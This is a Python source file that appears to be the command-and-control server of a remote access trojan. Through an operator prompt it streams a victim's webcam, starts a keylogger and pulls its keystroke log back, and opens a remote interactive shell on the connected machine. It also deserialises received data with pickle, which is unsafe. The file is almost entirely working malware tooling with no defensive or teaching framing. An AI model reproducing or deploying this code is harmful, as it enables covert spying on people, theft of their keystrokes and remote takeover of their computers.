import socket
import threading
import time
import numpy
import cv2
import struct
import pickle

# -- GLOBAL VARIABLES -- 
HEADER = 64
PORT = 8080
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

'''
def handle_client(conn, addr):
    print(f"[NEW CONNECTION] -- {addr} has conected")

    connected = True
    while connected:
        msg = conn.recv()
'''

def webCam(conn, command, addr):
    conn.send(command)
    data = b''
    payload_size = struct.calcsize("L") 
    while True:
        while len(data) < payload_size:
            data += conn.recv(4096)
        
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("L", packed_msg_size)[0]
        
        while len(data) < msg_size:
            data += conn.recv(4096)
        
        frame_data = data[:msg_size]
        data = data[msg_size:]
        ###

        frame=pickle.loads(frame_data)
        cv2.imshow('frame',frame)
        if cv2.waitKey(5) == 27:
            break 
    cv2.destroyAllWindows()

def getKeys(conn, command, addr):
    conn.send(command)
    
def transfer(conn,command):
    conn.send(command)
    f = open('test.txt','wb')
    while True:  
        bits = conn.recv(1024)
        if bits.endswith(b'DONE'):
            print('[+] Transferring KeyLog File...')
            time.sleep(2)
            print('\n[+] Transfer completed ')
            f.close()
            break
        f.write(bits)
    
def get_shell(conn, command):
   conn.send(command) 
   while True:
        cmd = input(" CMD > ").encode()
        
        if b'close' in cmd:
            break
        conn.send(cmd)
        stdout = conn.recv(1024*1024)

        print(stdout.decode())

def start():
    server.listen()
    print(f"[LISTENING] -- Server is listeing on {SERVER}")
    while True:
        conn, addr = server.accept()
        
        while True:
            command = input(" >> ").encode()
            print(command, type(command))
            if b'open_webcam' in command:
                webCam(conn, command, addr)
            elif b'logger_start' in command:
                conn.send(command)
            elif b'logger_end' in command:
                transfer(conn, command)
            elif b'get_shell' in command:
                get_shell(conn, command)
            else:
                break
        

print("[STARTING] -- Server is starting ... ")
start()